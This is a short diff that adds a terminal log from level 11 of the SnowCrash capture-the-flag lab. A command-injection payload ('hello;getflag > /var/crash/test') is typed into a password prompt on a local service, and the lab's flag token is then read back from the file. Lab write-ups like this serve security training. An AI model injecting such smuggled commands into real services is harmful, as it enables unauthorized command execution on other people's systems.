@@ -1,0 +1,6 @@
+level11@SnowCrash:~$ nc localhost 5151
+Password: hello;getflag > /var/crash/test
+Erf nope..
+level11@SnowCrash:~$ cat /var/crash/test
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level11@SnowCrash:~$
